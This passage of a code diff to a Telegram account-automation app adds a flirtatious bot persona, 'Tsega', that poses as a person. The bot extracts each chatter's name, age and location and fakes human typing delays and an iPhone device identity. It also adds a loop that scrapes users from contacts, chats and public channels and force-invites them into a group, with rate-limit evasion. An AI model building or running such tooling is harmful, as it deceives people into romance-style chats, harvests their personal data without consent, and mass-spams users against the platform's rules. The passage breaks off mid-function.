         age_match = re.search(r'(\d+)', message_text)
         if age_match:
-            info['age'] = age_match.group(1)
+            age = age_match.group(1)
+            user_info['age'] = age
             conversation_memory.clear_waiting(chat_id)
-            conversation_memory.advance_stage(chat_id)
-            return f"Oh {info['age']}! Where are you from?"
-        return random.choice(ABEL_REPLIES["ask_age"])
+            
+            response = random.choice(TSEGA_REPLIES["user_tells_age"])
+            response = response.format(age)
+            
+            # Ask for location next
+            response += " " + random.choice(TSEGA_REPLIES["ask_location"])
+            conversation_memory.set_waiting_for(chat_id, "location")
+            return response
     
-    if intent == "answering_location":
-        info['location'] = message_text.strip().title()
-        conversation_memory.clear_waiting(chat_id)
-        conversation_memory.advance_stage(chat_id)
-        return f"{info['location']} – nice! What do you do?"
+    # Handle user telling name (not as answer)
+    if intent == "user_tells_name" and chat_id:
+        name = conversation_memory.extract_name(message_text)
+        if name and name != "ASKING_MY_NAME":
+            user_info['name'] = name
+            conversation_memory.clear_waiting(chat_id)
+            
+            response = random.choice(TSEGA_REPLIES["user_tells_name"])
+            response = response.format(name)
+            
+            # Ask for age naturally
+            response += " " + random.choice(TSEGA_REPLIES["ask_age"])
+            conversation_memory.set_waiting_for(chat_id, "age")
+            return response
     
-    if intent == "answering_job":
-        info['job'] = message_text.strip().title()
-        conversation_memory.clear_waiting(chat_id)
-        conversation_memory.advance_stage(chat_id)
-        return f"Interesting! What do you enjoy doing in your free time?"
+    # Handle ask for my name
+    if intent == "ask_name":
+        user_info['asked_for_name'] = True
+        response = random.choice(TSEGA_REPLIES["introduce_myself"])
+        conversation_memory.set_waiting_for(chat_id, "name")
+        return response
     
-    mapping = {
-        "how_are_you": "how_are_you",
-        "flirty": "flirty",
-        "bro_compliment": "bro_compliment",
-        "default": "default"
-    }
+    # Handle agreement
+    if intent == "agree":
+        return random.choice(TSEGA_REPLIES["agree"])
     
-    return random.choice(ABEL_REPLIES.get(mapping.get(intent, "default"), ABEL_REPLIES["default"]))
+    # Handle disagreement
+    if intent == "disagree":
+        return random.choice(TSEGA_REPLIES["disagree"])
+    
+    # Handle voice/media
+    if intent == "voice_received" or "[Voice" in message_text:
+        return random.choice(TSEGA_REPLIES["voice_received"])
+    
+    if intent == "media_received" or "[Photo" in message_text or "[Video" in message_text:
+        return random.choice(TSEGA_REPLIES["media_received"])
+    
+    if intent == "link_received" or "http" in message_text.lower():
+        return random.choice(TSEGA_REPLIES["link_received"])
+    
+    # Get standard response for intent
+    templates = TSEGA_REPLIES.get(intent, TSEGA_REPLIES["default"])
+    response = random.choice(templates)
+    
+    # Personalize with name if known
+    if user_info and user_info.get('name'):
+        # Add name to beginning of response
+        response = f"{user_info['name']}, {response.lower()}"
+    
+    # Add emoji
+    sexy_emojis = ["😘", "💋", "💕", "😏", "💓", "🌹", "✨", "💫", "😉", "🔥"]
+    if random.random() < 0.4:
+        response += " " + random.choice(sexy_emojis)
+    
+    return response
+
+# ==================== FIXED AUTO-REPLY HANDLER ====================
 
 async def auto_reply_handler(event, account_id):
+    """Handle incoming messages with intelligent responses"""
     try:
         if event.out:
             return
         
         chat = await event.get_chat()
+        
+        # Only reply to private users
         if hasattr(chat, 'title') and chat.title:
+            return
+        if hasattr(chat, 'participants_count') and chat.participants_count > 2:
             return
         
         chat_id = str(event.chat_id)
         message_text = event.message.text or ""
         
+        # Check for media
+        has_media = event.message.media is not None
+        if has_media:
+            if hasattr(event.message.media, 'voice'):
+                message_text = "[Voice Message] " + message_text
+            elif hasattr(event.message.media, 'photo'):
+                message_text = "[Photo] " + message_text
+            elif hasattr(event.message.media, 'video'):
+                message_text = "[Video] " + message_text
+        
+        logger.info(f"📨 Message from {chat_id}: '{message_text}'")
+        
+        # Check if auto-reply is enabled
         account_key = str(account_id)
         if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
             return
         
-        conversation_memory.detect_gender(chat_id, message_text)
-        
+        # Detect intent
         intent = detect_intent(message_text, chat_id)
+        logger.info(f"Detected intent: {intent}")
+        
+        # Generate response
         response = generate_response(intent, chat_id, message_text)
         
         if not response:
-            response = "Hey there! Abel here. What's on your mind? 😊"
+            response = "ሰላም ውዴ! እንዴት ነህ? 😘"
         
-        info = conversation_memory.get_user_info(chat_id)
-        if not info['name']:
-            conversation_memory.set_waiting_for(chat_id, "name")
-        elif not info['age']:
-            conversation_memory.set_waiting_for(chat_id, "age")
-        elif not info['location']:
-            conversation_memory.set_waiting_for(chat_id, "location")
-        elif not info['job']:
-            conversation_memory.set_waiting_for(chat_id, "job")
-        
+        # Random delay between 15-40 seconds
         delay = random.randint(15, 40)
+        logger.info(f"⏱️ Waiting {delay} seconds before replying...")
+        
+        # Show typing indicator
         async with event.client.action(event.chat_id, 'typing'):
             await asyncio.sleep(delay)
         
+        # Send reply
         await event.reply(response)
-        logger.info(f"Sent reply: {response[:50]}...")
+        logger.info(f"✅ Replied after {delay}s: '{response[:50]}...'")
         
     except Exception as e:
-        logger.error(f"Auto-reply error: {e}")
+        logger.error(f"Error in auto-reply: {e}")
+        try:
+            await event.reply("ሰላም ውዴ! ትንሽ እንነጋገር? 😘")
+        except:
+            pass
+# ==================== ENHANCED AUTO-REPLY HANDLER ====================
 
+
+
+# [REST OF YOUR CODE - everything after this point stays exactly the same]
+# Continue with start_auto_reply_for_account, keep_alive, all API routes, etc.
 async def start_auto_reply_for_account(account):
+    """Start auto-reply listener with AUTO-RECONNECT capability"""
     account_id = account['id']
     account_key = str(account_id)
+    reconnect_count = 0
     
-    while True:
+    while True:  # Infinite reconnect loop
         try:
+            logger.info(f"Starting auto-reply for account {account_id} (attempt {reconnect_count + 1})")
+            
+            # Create client with robust settings
             client = TelegramClient(
-                StringSession(account['session']),
-                API_ID, API_HASH,
+                StringSession(account['session']), 
+                API_ID, 
+                API_HASH,
                 connection_retries=10,
                 retry_delay=5,
-                timeout=60
+                timeout=60,
+                device_model="iPhone 13",
+                system_version="15.0",
+                app_version="8.4.1"
             )
+            
             await client.connect()
             
+            # Check authorization
             if not await client.is_user_authorized():
-                remove_invalid_account(account_id)
-                break
+                logger.error(f"Account {account_id} not authorized")
+                await asyncio.sleep(30)
+                reconnect_count += 1
+                continue
             
+            # Store client
             active_clients[account_key] = client
             
+            # Define message handler
             @client.on(NewMessage(incoming=True))
             async def handler(event):
                 await auto_reply_handler(event, account_id)
             
-            logger.info(f"✅ Auto-reply active for {account.get('name')}")
+            # Start client
+            await client.start()
+            logger.info(f"✅ Auto-reply ACTIVE for {account.get('name')} ({account.get('phone')})")
+            
+            # Reset reconnect count on success
+            reconnect_count = 0
+            
+            # Keep running until disconnected
             await client.run_until_disconnected()
             
         except Exception as e:
-            logger.error(f"Connection lost: {e}")
+            logger.error(f"Connection lost for account {account_id}: {e}")
             if account_key in active_clients:
                 del active_clients[account_key]
-            await asyncio.sleep(30)
+            
+            # Exponential backoff for reconnection
+            reconnect_count += 1
+            wait_time = min(30 * reconnect_count, 300)  # Max 5 minutes
+            logger.info(f"Reconnecting in {wait_time} seconds... (attempt {reconnect_count})")
+            await asyncio.sleep(wait_time)
 
 def stop_auto_reply_for_account(account_id):
+    """Stop auto-reply for a specific account"""
     account_key = str(account_id)
     if account_key in active_clients:
         try:
-            run_async(active_clients[account_key].disconnect())
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            loop.run_until_complete(active_clients[account_key].disconnect())
+            loop.close()
             del active_clients[account_key]
-        except:
-            pass
+            logger.info(f"Stopped auto-reply for account {account_key}")
+        except Exception as e:
+            logger.error(f"Error stopping auto-reply: {e}")
 
 def start_all_auto_replies():
+    """Start auto-reply for all enabled accounts"""
     for account in accounts:
         account_key = str(account['id'])
         if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
             if account_key not in active_clients:
                 thread = threading.Thread(
-                    target=lambda acc=account: run_async(start_auto_reply_for_account(acc)),
+                    target=lambda: run_async(start_auto_reply_for_account(account)),
                     daemon=True
                 )
                 thread.start()
                 client_tasks[account_key] = thread
+                time.sleep(2)
+# ==================== AUTO-ADD MEMBER FEATURE - MULTI-SOURCE ===================
+# ==================== PROFESSIONAL AUTO-ADD SYSTEM ====================
 
-# ==================== AUTO-ADD SYSTEM ====================
+auto_add_settings = {}
+AUTO_ADD_FILE = 'auto_add_settings.json'
+
+# Load auto-add settings
+def load_auto_add_settings():
+    global auto_add_settings
+    try:
+        if os.path.exists(AUTO_ADD_FILE):
+            with open(AUTO_ADD_FILE, 'r') as f:
+                content = f.read()
+                if content.strip():
+                    auto_add_settings = json.loads(content)
+                else:
+                    auto_add_settings = {}
+        else:
+            auto_add_settings = {}
+            with open(AUTO_ADD_FILE, 'w') as f:
+                json.dump({}, f)
+        logger.info(f"Loaded auto-add settings for {len(auto_add_settings)} accounts")
+    except Exception as e:
+        logger.error(f"Error loading auto-add settings: {e}")
+        auto_add_settings = {}
+
+# Save auto-add settings
+def save_auto_add_settings():
+    try:
+        with open(AUTO_ADD_FILE, 'w') as f:
+            json.dump(auto_add_settings, f, indent=2)
+        return True
+    except Exception as e:
+        logger.error(f"Error saving auto-add settings: {e}")
+        return False
+
+# Load settings on startup
+load_auto_add_settings()
+
+@app.route('/api/auto-add-settings', methods=['GET'])
+def get_auto_add_settings():
+    account_id = request.args.get('accountId')
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
+    account_key = str(account_id)
+    
+    # Default settings
+    default_settings = {
+        'enabled': False,
+        'target_group': 'Abe_armygroup',
+        'delay_seconds': 25,
+        'source_groups': ['@telegram', '@durov', '@TechCrunch', '@bbcnews', '@cnn'],
+        'use_contacts': True,
+        'use_recent_chats': True,
+        'use_scraping': True,
+        'use_mutual_contacts': True,
+        'scrape_limit_per_group': 200,
+        'skip_bots': True,
+        'skip_inaccessible': True,
+        'auto_join': True,
+        'total_added': 0,
+        'added_today': 0,
+        'last_reset': datetime.now().strftime('%Y-%m-%d'),
+        'last_added': None
+    }
+    
+    # Get existing settings or use defaults
+    if account_key in auto_add_settings:
+        settings = auto_add_settings[account_key]
+        # Ensure all fields exist
+        for key, value in default_settings.items():
+            if key not in settings:
+                settings[key] = value
+    else:
+        settings = default_settings.copy()
+        auto_add_settings[account_key] = settings
+        save_auto_add_settings()
+    
+    return jsonify({'success': True, 'settings': settings})
+
+@app.route('/api/auto-add-settings', methods=['POST'])
+def update_auto_add_settings():
+    try:
+        data = request.json
+        if not data:
+            return jsonify({'success': False, 'error': 'No data received'})
+        
+        account_id = data.get('accountId')
+        if not account_id:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        
+        account_key = str(account_id)
+        
+        # Initialize if not exists
+        if account_key not in auto_add_settings:
+            auto_add_settings[account_key] = {}
+        
+        was_enabled = auto_add_settings[account_key].get('enabled', False)
+        
+        # Update settings with all fields
+        auto_add_settings[account_key]['enabled'] = data.get('enabled', False)
+        auto_add_settings[account_key]['target_group'] = data.get('target_group', 'Abe_armygroup')
+        auto_add_settings[account_key]['delay_seconds'] = data.get('delay_seconds', 25)
+        auto_add_settings[account_key]['source_groups'] = data.get('source_groups', [])
+        auto_add_settings[account_key]['use_contacts'] = data.get('use_contacts', True)
+        auto_add_settings[account_key]['use_recent_chats'] = data.get('use_recent_chats', True)
+        auto_add_settings[account_key]['use_scraping'] = data.get('use_scraping', True)
+        auto_add_settings[account_key]['use_mutual_contacts'] = data.get('use_mutual_contacts', True)
+        auto_add_settings[account_key]['scrape_limit_per_group'] = data.get('scrape_limit_per_group', 200)
+        auto_add_settings[account_key]['skip_bots'] = data.get('skip_bots', True)
+        auto_add_settings[account_key]['skip_inaccessible'] = data.get('skip_inaccessible', True)
+        auto_add_settings[account_key]['auto_join'] = data.get('auto_join', True)
+        
+        # Initialize counters if not exist
+        if 'total_added' not in auto_add_settings[account_key]:
+            auto_add_settings[account_key]['total_added'] = 0
+        if 'added_today' not in auto_add_settings[account_key]:
+            auto_add_settings[account_key]['added_today'] = 0
+        
+        # Reset daily counter if new day
+        today = datetime.now().strftime('%Y-%m-%d')
+        if auto_add_settings[account_key].get('last_reset') != today:
+            auto_add_settings[account_key]['added_today'] = 0
+            auto_add_settings[account_key]['last_reset'] = today
+        
+        # Save settings
+        if not save_auto_add_settings():
+            return jsonify({'success': False, 'error': 'Failed to save settings'})
+        
+        logger.info(f"Auto-add settings saved for account {account_id}: enabled={auto_add_settings[account_key]['enabled']}")
+        
+        # Start or stop auto-add thread
+        enabled = auto_add_settings[account_key]['enabled']
+        if enabled and not was_enabled:
+            account = next((acc for acc in accounts if acc['id'] == account_id), None)
+            if account:
+                thread = threading.Thread(
+                    target=lambda: run_async(professional_auto_add_loop(account)),
+                    daemon=True
+                )
+                thread.start()
+                client_tasks[f"auto_add_{account_key}"] = thread
+                logger.info(f"🚀 Started professional auto-add for account {account_id}")
+        elif not enabled and was_enabled:
+            logger.info(f"Auto-add disabled for account {account_id}")
+        
+        return jsonify({'success': True, 'message': 'Auto-add settings updated'})
+        
+    except Exception as e:
+        logger.error(f"Error in update_auto_add_settings: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/auto-add-stats', methods=['GET'])
+def get_auto_add_stats():
+    account_id = request.args.get('accountId')
+    if not account_id:
+        return jsonify({'success': False, 'error': 'Account ID required'})
+    
+    account_key = str(account_id)
+    settings = auto_add_settings.get(account_key, {})
+    
+    return jsonify({
+        'success': True,
+        'added_today': settings.get('added_today', 0),
+        'total_added': settings.get('total_added', 0),
+        'enabled': settings.get('enabled', False),
+        'last_reset': settings.get('last_reset', ''),
+        'last_added': settings.get('last_added')
+    })
+
+@app.route('/api/test-auto-add', methods=['POST'])
+def test_auto_add():
+    """Test auto-add functionality - finds available members without adding"""
+    try:
+        data = request.json
+        account_id = data.get('accountId')
+        
+        if not account_id:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        
+        account = next((acc for acc in accounts if acc['id'] == account_id), None)
+        if not account:
+            return jsonify({'success': False, 'error': 'Account not found'})
+        
+        async def test():
+            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+            await client.connect()
+            
+            try:
+                if not await client.is_user_authorized():
+                    return {'success': False, 'error': 'Account not authorized'}
+                
+                settings = auto_add_settings.get(str(account_id), {})
+                target_group = settings.get('target_group', 'Abe_armygroup')
+                
+                # Clean target group name
+                if not target_group.startswith('@') and not target_group.startswith('https://'):
+                    target_group = '@' + target_group
+                
+                # Test finding target group
+                group_found = False
+                group_title = target_group
+                existing_members_count = 0
+                
+                try:
+                    group = await client.get_entity(target_group)
+                    group_found = True
+                    group_title = group.title if hasattr(group, 'title') else target_group
+                    
+                    # Count existing members
+                    count = 0
+                    async for _ in client.iter_participants(group, limit=1000):
+                        count += 1
+                    existing_members_count = count
+                except Exception as e:
+                    return {'success': False, 'error': f'Target group not found: {str(e)}'}
+                
+                # Test finding members from all sources
+                available_members = 0
+                sources_found = []
+                
+                # Contacts
+                if settings.get('use_contacts', True):
+                    try:
+                        contacts = await client(functions.contacts.GetContactsRequest(0))
+                        available_members += len(contacts.users)
+                        sources_found.append(f"Contacts: {len(contacts.users)}")
+                    except:
+                        pass
+                
+                # Recent chats
+                if settings.get('use_recent_chats', True):
+                    try:
+                        dialogs = await client.get_dialogs(limit=100)
+                        users = [d for d in dialogs if d.is_user]
+                        available_members += len(users)
+                        sources_found.append(f"Recent Chats: {len(users)}")
+                    except:
+                        pass
+                
+                # Source groups
+                if settings.get('use_scraping', True):
+                    source_groups = settings.get('source_groups', [])
+                    for sg in source_groups[:3]:
+                        try:
+                            sg_clean = sg.strip()
+                            if not sg_clean:
+                                continue
+                            if not sg_clean.startswith('@'):
+                                sg_clean = '@' + sg_clean
+                            sg_entity = await client.get_entity(sg_clean)
+                            count = 0
+                            async for _ in client.iter_participants(sg_entity, limit=50):
+                                count += 1
+                            available_members += count
+                            sources_found.append(f"{sg_clean}: {count}+")
+                        except:
+                            pass
+                
+                return {
+                    'success': True,
+                    'group_found': group_found,
+                    'group_title': group_title,
+                    'existing_members': existing_members_count,
+                    'available_members': available_members,
+                    'sources_found': sources_found,
+                    'can_add_members': group_found and available_members > 0
+                }
+                
+            except Exception as e:
+                return {'success': False, 'error': str(e)}
+            finally:
+                await client.disconnect()
+        
+        result = run_async(test())
+        return jsonify(result)
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
 
 async def get_all_potential_members(client, settings, existing_members_set):
+    """
+    Get potential members from ALL available sources.
+    Returns a set of user IDs that are NOT already in the group.
+    """
     potential_members = set()
+    sources_stats = {}
     
-    # From contacts
+    # 1. Get from contacts
     if settings.get('use_contacts', True):
         try:
+            logger.info("📱 Scanning contacts...")
             contacts = await client(functions.contacts.GetContactsRequest(0))
+            contact_ids = set()
             for user in contacts.users:
-                if user and user.id and not (settings.get('skip_bots', True) and user.bot):
-                    potential_members.add(user.id)
-        except:
-            pass
+                if user and user.id:
+                    if settings.get('skip_bots', True) and user.bot:
+                        continue
+                    contact_ids.add(user.id)
+            
+            new_from_contacts = contact_ids - existing_members_set
+            potential_members.update(new_from_contacts)
+            sources_stats['contacts'] = {'found': len(contact_ids), 'new': len(new_from_contacts)}
+            logger.info(f"   ✅ Contacts: {len(contact_ids)} found, {len(new_from_contacts)} new")
+        except Exception as e:
+            logger.error(f"   ❌ Contacts error: {e}")
+            sources_stats['contacts'] = {'error': str(e)}
     
-    # From recent chats
+    # 2. Get from recent chats/dialogs
     if settings.get('use_recent_chats', True):
         try:
+            logger.info("💬 Scanning recent chats...")
             dialogs = await client.get_dialogs(limit=500)
+            dialog_ids = set()
             for dialog in dialogs:
                 if dialog.is_user and dialog.entity and dialog.entity.id:
                     user = dialog.entity
-                    if not (settings.get('skip_bots', True) and user.bot):
-                        potential_members.add(user.id)
-        except:
-            pass
+                    if settings.get('skip_bots', True) and user.bot:
+                        continue
+                    dialog_ids.add(user.id)
+            
+            new_from_dialogs = dialog_ids - existing_members_set
+            potential_members.update(new_from_dialogs)
+            sources_stats['recent_chats'] = {'found': len(dialog_ids), 'new': len(new_from_dialogs)}
+            logger.info(f"   ✅ Recent chats: {len(dialog_ids)} found, {len(new_from_dialogs)} new")
+        except Exception as e:
+            logger.error(f"   ❌ Recent chats error: {e}")
+            sources_stats['recent_chats'] = {'error': str(e)}
     
-    # From source groups
+    # 3. Scrape from source groups
     if settings.get('use_scraping', True):
         source_groups = settings.get('source_groups', [])
         scrape_limit = settings.get('scrape_limit_per_group', 200)
@@ -439,143 +1295,316 @@ async def get_all_potential_members(client, settings, existing_members_set):
         for group_ref in source_groups:
             if not group_ref or not group_ref.strip():
                 continue
+            
+            group_ref_clean = group_ref.strip()
+            if group_ref_clean.startswith('https://t.me/'):
+                group_ref_clean = group_ref_clean.replace('https://t.me/', '@')
+            elif not group_ref_clean.startswith('@'):
+                group_ref_clean = '@' + group_ref_clean
+            
             try:
-                clean_ref = group_ref.strip()
-                if not clean_ref.startswith('@'):
-                    clean_ref = '@' + clean_ref
-                source_group = await client.get_entity(clean_ref)
-                count = 0
+                logger.info(f"👥 Scraping {group_ref_clean}...")
+                source_group = await client.get_entity(group_ref_clean)
+                
+                scraped_ids = set()
                 async for user in client.iter_participants(source_group, limit=scrape_limit):
-                    if user and user.id and not (settings.get('skip_bots', True) and user.bot):
-                        potential_members.add(user.id)
-                        count += 1
-                        if count >= scrape_limit:
+                    if user and user.id:
+                        if settings.get('skip_bots', True) and user.bot:
+                            continue
+                        scraped_ids.add(user.id)
+                        if len(scraped_ids) >= scrape_limit:
                             break
-            except:
-                pass
+                
+                new_from_group = scraped_ids - existing_members_set
+                potential_members.update(new_from_group)
+                sources_stats[group_ref_clean] = {'found': len(scraped_ids), 'new': len(new_from_group)}
+                logger.info(f"   ✅ {group_ref_clean}: {len(scraped_ids)} found, {len(new_from_group)} new")
+                
+            except errors.FloodWaitError as e:
+                logger.warning(f"   ⏳ Flood wait {e.seconds}s for {group_ref_clean}")
+                sources_stats[group_ref_clean] = {'error': f'Flood wait {e.seconds}s'}
+            except Exception as e:
+                logger.error(f"   ❌ {group_ref_clean} error: {e}")
+                sources_stats[group_ref_clean] = {'error': str(e)}
     
-    # From mutual contacts
+    # 4. Get from mutual contacts / top peers
     if settings.get('use_mutual_contacts', True):
         try:
+            logger.info("🤝 Scanning mutual contacts...")
             mutual = await client(functions.contacts.GetTopPeersRequest(
-                correspondents=True, bots_pm=False,
-                groups=False, channels=False, limit=100
+                correspondents=True,
+                bots_pm=False,
+                groups=False,
+                channels=False,
+                limit=100
             ))
+            mutual_ids = set()
             if mutual.categories:
                 for category in mutual.categories:
                     for peer in category.peers:
                         if hasattr(peer, 'user_id'):
-                            potential_members.add(peer.user_id)
-        except:
-            pass
+                            mutual_ids.add(peer.user_id)
+            
+            new_from_mutual = mutual_ids - existing_members_set
+            potential_members.update(new_from_mutual)
+            sources_stats['mutual_contacts'] = {'found': len(mutual_ids), 'new': len(new_from_mutual)}
+            logger.info(f"   ✅ Mutual contacts: {len(mutual_ids)} found, {len(new_from_mutual)} new")
+        except Exception as e:
+            logger.error(f"   ❌ Mutual contacts error: {e}")
+            sources_stats['mutual_contacts'] = {'error': str(e)}
     
-    # Remove existing members
-    return potential_members - existing_members_set
+    return potential_members, sources_stats
 
 async def professional_auto_add_loop(account):
+    """Professional auto-add loop with unlimited daily adds and intelligent source management"""
     account_id = account['id']
     account_key = str(account_id)
-    attempted_members = set()
     
-    logger.info(f"🚀 Auto-Add started for account {account_id}")
+    # Track already attempted members to avoid infinite retries
+    attempted_members = set()
+    auto_joined = False
+    consecutive_errors = 0
+    max_consecutive_errors = 10
+    
+    logger.info(f"🚀 Professional Auto-Add started for account {account_id}")
     
     while True:
         try:
+            # Check if still enabled
             if account_key not in auto_add_settings or not auto_add_settings[account_key].get('enabled', False):
+                logger.info(f"Auto-add disabled for account {account_id}, stopping loop")
                 break
             
             settings = auto_add_settings[account_key]
             target_group = settings.get('target_group', 'Abe_armygroup')
             delay_seconds = settings.get('delay_seconds', 25)
             
-            if not target_group.startswith('@'):
+            # Clean target group name
+            if not target_group.startswith('@') and not target_group.startswith('https://'):
                 target_group = '@' + target_group
+            elif target_group.startswith('https://t.me/'):
+                target_group = '@' + target_group.replace('https://t.me/', '')
             
-            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+            # Create client
+            client = TelegramClient(
+                StringSession(account['session']), 
+                API_ID, 
+                API_HASH,
+                connection_retries=5,
+                retry_delay=5,
+                timeout=60
+            )
             await client.connect()
             
             try:
                 if not await client.is_user_authorized():
+                    logger.error(f"Account {account_id} not authorized")
                     await asyncio.sleep(60)
                     continue
                 
-                # Get target group
-                group = await client.get_entity(target_group)
+                # Reset daily counter if new day
+                today = datetime.now().strftime('%Y-%m-%d')
+                if settings.get('last_reset') != today:
+                    settings['added_today'] = 0
+                    settings['last_reset'] = today
+                    attempted_members.clear()  # Reset attempted members daily
+                    save_auto_add_settings()
+                    logger.info(f"📅 New day! Reset daily counter. Total all-time: {settings.get('total_added', 0)}")
                 
-                # Get existing members
+                # Auto-join target group if needed
+                if not auto_joined and settings.get('auto_join', True):
+                    try:
+                        logger.info(f"🔗 Attempting to join {target_group}...")
+                        group = await client.get_entity(target_group)
+                        try:
+                            await client(functions.messages.ImportChatInviteRequest(group.username))
+                        except:
+                            await client.join_channel(group.id)
+                        auto_joined = True
+                        logger.info(f"✅ Successfully joined {target_group}")
+                    except Exception as e:
+                        logger.warning(f"Could not auto-join {target_group}: {e}")
+                
+                # Get target group and existing members
+                try:
+                    group = await client.get_entity(target_group)
+                    logger.info(f"🎯 Target group: {group.title if hasattr(group, 'title') else target_group}")
+                except Exception as e:
+                    logger.error(f"❌ Cannot find target group {target_group}: {e}")
+                    await asyncio.sleep(300)
+                    continue
+                
+                # Get existing members (to avoid duplicates)
+                logger.info("📋 Getting existing members...")
                 existing_members = set()
                 try:
                     async for user in client.iter_participants(group, limit=5000):
                         if user and user.id:
                             existing_members.add(user.id)
-                except:
-                    pass
+                    logger.info(f"   Group has {len(existing_members)} existing members")
+                except Exception as e:
+                    logger.error(f"Error getting existing members: {e}")
                 
-                logger.info(f"Group has {len(existing_members)} members")
+                # Get potential members from all sources
+                logger.info("🔍 Collecting potential members from ALL sources...")
+                potential_members, sources_stats = await get_all_potential_members(
+                    client, settings, existing_members
+                )
                 
-                # Get potential members
-                potential_members = await get_all_potential_members(client, settings, existing_members)
-                fresh_members = potential_members - attempted_members
+                total_found = sum(s.get('found', 0) for s in sources_stats.values() if isinstance(s, dict))
+                total_new = sum(s.get('new', 0) for s in sources_stats.values() if isinstance(s, dict))
                 
-                logger.info(f"Found {len(fresh_members)} new members to add")
+                logger.info(f"📊 SUMMARY: {total_found} total found, {total_new} new members available")
                 
-                if not fresh_members:
-                    attempted_members.clear()
-                    await asyncio.sleep(300)
+                if not potential_members:
+                    logger.info("😴 No new members available. Waiting 10 minutes before next scan...")
+                    await asyncio.sleep(600)
                     continue
                 
+                # Filter out already attempted members
+                fresh_members = potential_members - attempted_members
+                logger.info(f"🎯 {len(fresh_members)} members to add (excluding {len(attempted_members)} already attempted)")
+                
+                if not fresh_members:
+                    logger.info("All potential members already attempted. Clearing attempt history...")
+                    attempted_members.clear()
+                    fresh_members = potential_members
+                
+                # Add members one by one with delay
                 added_this_cycle = 0
+                
                 for user_id in list(fresh_members):
-                    if account_key not in auto_add_settings or not auto_add_settings[account_key].get('enabled', False):
-                        break
-                    
-                    attempted_members.add(user_id)
-                    
                     try:
-                        user_entity = await client.get_input_entity(user_id)
-                        await client(functions.channels.InviteToChannelRequest(group, [user_entity]))
+                        # Check if still enabled
+                        if account_key not in auto_add_settings or not auto_add_settings[account_key].get('enabled', False):
+                            break
                         
-                        settings['added_today'] = settings.get('added_today', 0) + 1
-                        settings['total_added'] = settings.get('total_added', 0) + 1
-                        settings['last_added'] = datetime.now().isoformat()
-                        added_this_cycle += 1
+                        # Mark as attempted
+                        attempted_members.add(user_id)
                         
-                        save_json_file(AUTO_ADD_FILE, auto_add_settings)
-                        logger.info(f"✅ Added user {user_id} | Total: {settings['total_added']}")
+                        # Skip if already in group (double-check)
+                        if user_id in existing_members:
+                            continue
                         
-                        await asyncio.sleep(delay_seconds)
-                        
-                    except errors.FloodWaitError as e:
-                        await asyncio.sleep(e.seconds + 5)
-                    except:
+                        # Try to add user
+                        try:
+                            user_entity = await client.get_input_entity(user_id)
+                            
+                            # Add to group
+                            await client(functions.channels.InviteToChannelRequest(
+                                group,
+                                [user_entity]
+                            ))
+                            
+                            # Update counters
+                            settings['added_today'] = settings.get('added_today', 0) + 1
+                            settings['total_added'] = settings.get('total_added', 0) + 1
+                            settings['last_added'] = datetime.now().isoformat()
+                            added_this_cycle += 1
+                            existing_members.add(user_id)
+                            
+                            # Save settings periodically
+                            if added_this_cycle % 10 == 0:
+                                save_auto_add_settings()
+                            
+                            logger.info(f"✅ Added user {user_id} | Today: {settings['added_today']} | Total: {settings['total_added']}")
+                            
+                            # Reset error counter on success
+                            consecutive_errors = 0
+                            
+                            # Wait between adds
+                            await asyncio.sleep(delay_seconds)
+                            
+                        except errors.FloodWaitError as e:
+                            logger.warning(f"⏳ Flood wait {e.seconds}s")
+                            await asyncio.sleep(e.seconds + 5)
+                        except errors.UserPrivacyRestrictedError:
+                            logger.info(f"🔒 User {user_id} has privacy restrictions")
+                            continue
+                        except errors.UserNotMutualContactError:
+                            logger.info(f"👤 User {user_id} - mutual contact required")
+                            continue
+                        except errors.UserAlreadyParticipantError:
+                            logger.info(f"👥 User {user_id} already in group")
+                            existing_members.add(user_id)
+                            continue
+                        except errors.UserKickedError:
+                            logger.info(f"🚫 User {user_id} was kicked/banned")
+                            continue
+                        except errors.UserBannedInChannelError:
+                            logger.info(f"⛔ User {user_id} banned in channel")
+                            continue
+                        except Exception as e:
+                            consecutive_errors += 1
+                            logger.error(f"Error adding {user_id}: {e}")
+                            
+                            if consecutive_errors >= max_consecutive_errors:
+                                logger.warning(f"⚠️ {consecutive_errors} consecutive errors. Pausing 5 minutes...")
+                                await asyncio.sleep(300)
+                                consecutive_errors = 0
+                            continue
+                            
+                    except Exception as e:
+                        logger.error(f"Unexpected error with user {user_id}: {e}")
                         continue
                 
-                logger.info(f"Cycle complete: Added {added_this_cycle} members")
+                # Save final settings
+                save_auto_add_settings()
                 
+                logger.info(f"📈 Cycle complete: Added {added_this_cycle} members")
+                logger.info(f"   Today: {settings['added_today']} | All-time: {settings['total_added']}")
+                
+                # If we added members, wait shorter time before next scan
                 if added_this_cycle > 0:
-                    await asyncio.sleep(random.randint(60, 180))
+                    wait_time = random.randint(60, 180)  # 1-3 minutes
                 else:
-                    await asyncio.sleep(random.randint(300, 600))
+                    wait_time = random.randint(300, 600)  # 5-10 minutes
                 
+                logger.info(f"⏰ Waiting {wait_time//60} minutes before next scan...")
+                
+            except Exception as e:
+                logger.error(f"Loop error: {e}")
             finally:
                 await client.disconnect()
             
+            await asyncio.sleep(random.randint(60, 300))
+            
         except Exception as e:
-            logger.error(f"Auto-add error: {e}")
+            logger.error(f"Critical error in auto-add loop: {e}")
             await asyncio.sleep(300)
 
-# ==================== KEEP ALIVE ====================
+# ==================== END PROFESSIONAL AUTO-ADD ==================== ====================
+# ==================== KEEP ALIVE SYSTEM ====================
 
 def keep_alive():
-    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:5000')
+    """Keep Render from sleeping and maintain Telegram connections"""
+    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://e-gram-98zv.onrender.com')
+    
     while True:
         try:
+            # Ping own app
+            requests.get(app_url, timeout=10)
             requests.get(f"{app_url}/api/health", timeout=10)
-        except:
-            pass
-        time.sleep(240)
+            
+            # Ping Telegram to keep connections alive
+            for account_key, client in list(active_clients.items()):
+                try:
+                    # Send a tiny ping to Telegram
